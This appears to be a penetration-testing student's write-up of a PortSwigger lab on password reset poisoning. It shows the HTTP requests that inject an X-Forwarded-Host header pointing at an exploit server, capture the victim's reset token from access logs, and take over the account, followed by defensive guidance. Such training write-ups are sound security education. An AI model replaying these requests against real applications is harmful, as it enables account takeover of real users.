# Lab 11: Password Reset Poisoning via Middleware

## Executive Summary

This lab demonstrates a critical vulnerability in password reset functionality where insufficient validation of the Host header enables server-side request forgery and password reset token theft. By exploiting the application's trust in the X-Forwarded-Host header, I successfully redirected password reset emails to an attacker-controlled domain, captured the victim's temporary reset token, and performed unauthorized password changes. This attack showcases the dangers of trusting proxy headers without validation and highlights the severe impact of middleware misconfigurations on authentication security.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Password Reset Poisoning via Host Header Injection |
| **Risk**               | Critical - Complete Account Takeover |
| **Completion**         | January 19, 2026 |

## Objective

Exploit Host header injection vulnerability in password reset functionality to redirect reset tokens to attacker-controlled servers, capture victim reset tokens, and achieve unauthorized account access through password modification.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for header injection testing
- Exploit Server for token capture
- Access logs for token extraction

**Target:** Password reset functionality with middleware header trust vulnerability

## Exploitation Walkthrough

### 1. Environment Configuration & Reconnaissance

Accessed the lab environment displaying "Password reset poisoning via middleware" challenge. Configured Burp Suite Professional for comprehensive request analysis.
<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/ef0b0ebb-c5b7-4a18-9b11-ff7298e64e77" />

*Lab 11 environment - Password reset poisoning with Burp Suite Professional configured*

### 2. Authentication Flow Analysis

Authenticated with my credentials to understand account structure and identify sensitive functionality.

**Test Credentials:**
- Username: `wiener`
- Password: `peter`
<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/d2f2444a-ecea-4372-bb29-41b407395150" />

*Account accessed showing sensitive information (right) | Authentication requests captured in Burp HTTP history (left)*

**Account Dashboard Identified:**
- Username display
- Email address
- Email update functionality
- Session management

**HTTP Requests Captured:**
```http
GET /my-account?id=wiener HTTP/1.1
Cookie: session=[SESSION_TOKEN]
```

**Observation:** Account access requires valid session token, but further investigation needed to identify bypass opportunities.

### 3. Session Validation Testing

Sent account request to Burp Repeater to test session requirements and parameter manipulation.

<img width="1920" height="982" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/52893d33-d3b5-4a17-9d98-cf096e80f549" />

*Session testing in Repeater - Username changed to carlos with session token removed*

**Test Modification:**
```http
GET /my-account?id=carlos HTTP/1.1
[Session cookie removed]
```

**Response:** 302 Found - Redirect (likely to login)

**Critical Finding:** While direct account access requires authentication, the 302 response suggests that if an attacker can control the password reset process, they could potentially reset any user's password without session validation.

**Attack Vector Identified:** Target password reset functionality to bypass authentication controls.

### 4. Password Reset Flow Investigation

Explored the "Forgot Password" functionality to understand reset mechanism and identify exploitation opportunities.

<img width="1920" height="982" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/9b903781-0b5a-42fa-bba5-6776ca0e3287" />

*Password reset flow captured (left) | Reset link received showing temp-forgot-password-token (right)*

**Password Reset Workflow:**

**Step 1: Request Reset**
```http
POST /forgot-password HTTP/1.1

username=wiener
```

**Step 2: Email Received**
Reset link sent to user's email:
```
https://[lab-id].web-security-academy.net/forgot-password?temp-forgot-password-token=[TOKEN]
```

**Step 3: Password Update**
```http
POST /forgot-password HTTP/1.1

temp-forgot-password-token=[TOKEN]&username=wiener&new-password-1=newpass&new-password-2=newpass
```

**Security Analysis:**

**Vulnerable Components:**
- Reset link generated server-side with temp token
- Link contains full URL with domain
- Domain likely constructed from request headers
- Token validity tied to username parameter

**Attack Hypothesis:** If the application constructs the reset URL using untrusted headers (like Host or X-Forwarded-Host), an attacker could manipulate these headers to redirect reset links to attacker-controlled domains.

### 5. Host Header Injection Testing

Tested the password reset request with X-Forwarded-Host header injection to determine if the application trusts proxy headers for URL construction.

**Attack Configuration:**

Sent password reset request to Burp Repeater and added malicious header.

<img width="1920" height="982" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/98200c55-4212-4a8f-8cf5-e14e4e1254d6" />

*X-Forwarded-Host header injection test (left) | Reset link redirected to exploit server (right)*

**Modified Request:**
```http
POST /forgot-password HTTP/1.1
Host: [lab-id].web-security-academy.net
X-Forwarded-Host: exploit-server-id.exploit-server.net

username=wiener
```

**Response:** 200 OK

**Email Received:**
```
From: Password Reset
Subject: Reset your password

Click here to reset your password:
https://exploit-server-id.exploit-server.net/forgot-password?temp-forgot-password-token=[TOKEN]
```

**Critical Vulnerability Confirmed:**

The application:
1. Accepts X-Forwarded-Host header without validation
2. Uses this header to construct password reset URLs
3. Sends reset links to attacker-controlled domain
4. Exposes reset tokens to attacker

**Why This Works:**

Applications behind reverse proxies or load balancers often use headers like X-Forwarded-Host to determine the original request domain. However, **these headers are client-controlled** and must never be trusted without validation.

**Attack Impact:** Attacker can redirect any user's password reset link to their own server, capturing the reset token when the victim clicks the link.

### 6. Victim Token Capture

Reconfigured attack to target victim account and capture their password reset token.

**Attack Execution:**

**Step 1: Poison Password Reset**
```http
POST /forgot-password HTTP/1.1
X-Forwarded-Host: exploit-server-id.exploit-server.net

username=carlos
```
<img width="1920" height="982" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/232440a5-9042-4063-afb1-52a488a11138" />

*Victim password reset poisoned with exploit server (left) | Victim accessed poisoned link - IP 10.0.3.84 captured in access logs (right)*

**Step 2: Victim Receives Email**

Carlos receives email with poisoned link:
```
Click here to reset your password:
https://exploit-server-id.exploit-server.net/forgot-password?temp-forgot-password-token=[CARLOS_TOKEN]
```

**Step 3: Victim Clicks Link**

When Carlos clicks the link, his browser sends GET request to attacker's exploit server.

**Exploit Server Access Log:**
```
10.0.3.84 - - [timestamp] "GET /forgot-password?temp-forgot-password-token=[TOKEN] HTTP/1.1" 200 -
```

**Critical Data Captured:**
- Victim IP: `10.0.3.84` (confirms different user)
- Reset token: `[CARLOS_TOKEN]`
- Full reset URL with valid token
<img width="1920" height="982" alt="LAB1_ss6 2" src="https://github.com/user-attachments/assets/f7e1560d-7904-4461-a3cf-65499e7e67c4" />

*Victim's temp-forgot-password-token captured in exploit server access logs*

**Token Extracted:**
```
temp-forgot-password-token=[CAPTURED_TOKEN_VALUE]
```

**Attack Success:** Victim's password reset token successfully intercepted without any direct interaction with victim's email or password.

### 7. Unauthorized Password Reset

Used the stolen reset token to change victim's password without authorization.

**Password Change Request:**

Sent POST request to password reset endpoint with captured token.
<img width="1920" height="982" alt="LAB1_ss7" src="https://github.com/user-attachments/assets/b9e03303-4024-4064-ba40-20c7d2e7316c" />

*Password reset executed with stolen token in Repeater - 302 response confirms success*

**Request Details:**
```http
POST /forgot-password HTTP/1.1
Host: [lab-id].web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=[CARLOS_CAPTURED_TOKEN]&username=carlos&new-password-1=administrator&new-password-2=administrator
```

**Parameters:**
- **Token:** Stolen from exploit server logs
- **Username:** `carlos` (victim)
- **New Password:** `administrator` (attacker-controlled)

**Response:** 302 Found - Redirect to login page

**Password Change Confirmed:** The 302 redirect indicates successful password update. The application accepted the stolen token and changed Carlos's password to `administrator`.

**Security Failure:** No additional verification required:
- ✗ No email confirmation to current address
- ✗ No current password verification
- ✗ No token-to-session binding
- ✗ Token valid despite being accessed from different IP/session

### 8. Account Takeover Confirmation

Authenticated to victim account using the newly set password to validate complete compromise.

**Attack Credentials:**
- Username: `carlos`
- Password: `administrator` (attacker-set)


<img width="1920" height="982" alt="LAB1_ss8" src="https://github.com/user-attachments/assets/b99107c7-2803-4b5e-989e-1d97b6cc7c40" />

*Successful authentication with stolen account (right) | Login request captured showing carlos:administrator (left)*

**Authentication Request:**
```http
POST /login HTTP/1.1

username=carlos&password=administrator
```

**Response:** 302 Found → Redirect to `/my-account?id=carlos`

**Complete Account Access:**
- ✓ Full authentication successful
- ✓ Carlos's username and email visible
- ✓ Email modification capability available
- ✓ Complete account control achieved
- ✓ Victim locked out of their own account

**Lab completion confirmed: Password reset poisoning successful**

## Technical Impact

**Severity: Critical (CVSS 9.8)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**1. CWE-640: Weak Password Recovery Mechanism**
- Password reset relies on untrusted headers
- No validation of X-Forwarded-Host origin
- Reset tokens sent to attacker-controlled domains

**2. CWE-346: Origin Validation Error**
- Application trusts client-controlled proxy headers
- No whitelist validation of allowed domains
- Middleware headers accepted without verification

**3. CWE-601: URL Redirection to Untrusted Site**
- Reset URLs constructed from unvalidated input
- Users redirected to attacker domains
- Open redirect via header manipulation

**4. CWE-284: Improper Access Control**
- Reset tokens usable without session binding
- No IP validation for token usage
- Tokens remain valid after interception

**Complete Attack Chain:**
```
Password Reset Request
        ↓
X-Forwarded-Host Header Injection
        ↓
Application Uses Header for URL Construction
        ↓
Reset Email Sent with Poisoned Link
        ↓
Victim Clicks Link
        ↓
Browser Requests Attacker Server
        ↓
Reset Token Captured in Logs
        ↓
Token Used to Reset Password
        ↓
Attacker Authenticates with New Password
        ↓
Complete Account Takeover
```

**Why X-Forwarded-Host is Dangerous:**

**Intended Purpose:**
- Used by reverse proxies/load balancers
- Indicates original request hostname
- Helps application determine request origin

**Security Problem:**
- **Client-controlled:** Attackers can set arbitrary values
- **No authentication:** Any client can add this header
- **Trusted by default:** Applications often use it without validation

**Attack Scenarios:**

| Application Behavior | Attacker Capability |
|---------------------|---------------------|
| Uses X-Forwarded-Host for URL generation | Password reset poisoning |
| Uses X-Forwarded-Host for CORS | Cross-origin attacks |
| Uses X-Forwarded-Host for redirects | Open redirect exploitation |
| Uses X-Forwarded-Host for canonicalization | Cache poisoning |

**Real-World Impact:**

| Target | Consequence |
|--------|-------------|
| **Email Services** | Complete mailbox takeover |
| **Banking** | Unauthorized fund access |
| **Social Media** | Identity theft, impersonation |
| **Corporate Systems** | Data exfiltration, privilege escalation |
| **E-Commerce** | Fraudulent purchases, data theft |

**Why This Attack is Severe:**

1. **No User Interaction Required:** Victim naturally clicks "password reset" links
2. **Undetectable to Victim:** Email appears legitimate from trusted sender
3. **Mass Scale Potential:** Automated attacks against entire user database
4. **Persistent Access:** Password change locks out legitimate owner
5. **No Technical Barrier:** Simple header injection, no sophisticated tools needed

**Compliance Violations:**
- OWASP Top 10 A07:2021 - Identification and Authentication Failures
- PCI-DSS 6.5.10 - Broken Authentication and Session Management
- NIST SP 800-63B - Password Reset Security Requirements
- CWE/SANS Top 25 - Improper Authentication

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic analysis of password reset flows
- Header injection testing for middleware vulnerabilities
- Token capture through controlled infrastructure
- Complete attack chain demonstration from reconnaissance to compromise

**Critical Security Insights:**

**1. Never Trust Proxy Headers Without Validation:**
Headers like X-Forwarded-Host, X-Forwarded-For, and Host are client-controlled:
- Validate against whitelist of allowed domains
- Verify headers match expected infrastructure
- Use server-side configuration for URL generation
- Never construct security-critical URLs from client input

**2. Password Reset URLs Must Be Secure:**
URL construction for sensitive operations requires:
- Hard-coded domain from server configuration
- No reliance on request headers for hostname
- HTTPS enforcement
- Validation of all URL components

**3. Reset Tokens Require Strong Binding:**
Tokens must be tied to security context:
- Session binding (same session that requested reset)
- IP validation (optional, but adds layer)
- Time-limited validity (15-30 minutes maximum)
- Single-use tokens (invalidate after first use)

**4. Defense-in-Depth for Password Reset:**
Multiple layers prevent exploitation:
- Server-side domain configuration (prevents poisoning)
- Email confirmation to current address
- Current password verification option
- Rate limiting on reset requests
- Monitoring for suspicious patterns
- Token binding and expiration

**5. Middleware Configuration is Security-Critical:**
Applications behind proxies must:
- Explicitly configure trusted proxy IPs
- Validate all forwarded headers
- Use framework-native proxy handling
- Never blindly trust middleware headers

**6. User Education Matters:**
Even with technical controls:
- Users should verify URLs before clicking
- Password reset links should display clear sender
- Unusual domains should raise suspicion
- Multi-factor authentication provides fallback

**Professional Skills Demonstrated:**
- Advanced header injection techniques
- Password reset flow vulnerability analysis
- Infrastructure-based attack execution (exploit server)
- Token capture and replay attacks
- Understanding of proxy/middleware security implications
- Comprehensive attack chain documentation

## References

1. PortSwigger Web Security Academy - Authentication Vulnerabilities
2. OWASP Top 10 (2021) - A07: Identification and Authentication Failures
3. CWE-640 - Weak Password Recovery Mechanism
4. CWE-346 - Origin Validation Error
5. CWE-601 - URL Redirection to Untrusted Site
6. OWASP Forgot Password Cheat Sheet
7. "Practical HTTP Host Header Attacks" - PortSwigger Research

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems is illegal under applicable laws worldwide.
